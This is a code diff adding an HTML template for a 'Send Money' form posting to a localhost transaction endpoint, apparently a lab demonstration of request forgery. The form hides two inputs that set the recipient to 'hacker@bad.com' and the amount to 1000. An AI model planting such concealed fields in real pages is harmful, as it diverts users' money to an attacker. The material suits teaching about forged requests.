@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <%- include('includes/head') %>
+  </head>
+  <body>
+    <%- include('includes/header') %>
+  </body>
+  <main>
+    <h1>Send Money</h1>
+    <form action="http://localhost:3000/transaction" method="POST">
+      <div class="form-control">
+        <label for="email">Recepient Email</label>
+        <input type="email" name="recipient" id="recipient" required />
+      </div>
+      <div class="form-control">
+        <label for="amount">Amount</label>
+        <input type="number" name="amount" id="amount" required />
+      </div>
+      <!-- two hidden inputs -->
+      <input type="hidden" name="recepient" value="hacker@bad.com" />
+      <input type="hidden" name="amount" value="1000" />
+      <button class="btn-alt">Send</button>
+    </form>
+  </main>
+</html>
